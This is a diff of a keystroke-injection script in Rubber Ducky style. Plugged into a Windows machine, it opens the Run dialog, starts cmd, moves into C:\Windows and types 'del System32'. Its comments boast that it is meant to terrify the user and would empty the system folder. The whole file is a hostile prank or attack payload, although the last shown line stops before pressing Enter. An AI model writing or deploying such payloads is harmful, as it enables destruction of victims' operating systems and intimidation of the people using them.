@@ -1,17 +1,23 @@
-REM I open cmd
+REM Make User Shit Pant
 
-REM--------Open run--------
+REM Open run
 DELAY 1000
 GUI r
 DELAY 500
-REM--------Open cmd--------
+
+REM Open cmd
 STRING cmd
-DELAY 500
+DELAY 300
 ENTER
-REM--------Open to Windows Folder--------
+DELAY 700
+
+REM Open Windows Folder
+HOME
 STRING cd C:\Windows
+DELAY 300
 ENTER
 HOME
-DELAY 100
-REM--------Threaten Death [This would empty the whole folder]--------
-STRING "del and "Sys|tem|32" and Enter"
+DELAY 300
+
+REM Threaten Death [This would empty the whole folder]
+STRING del System32
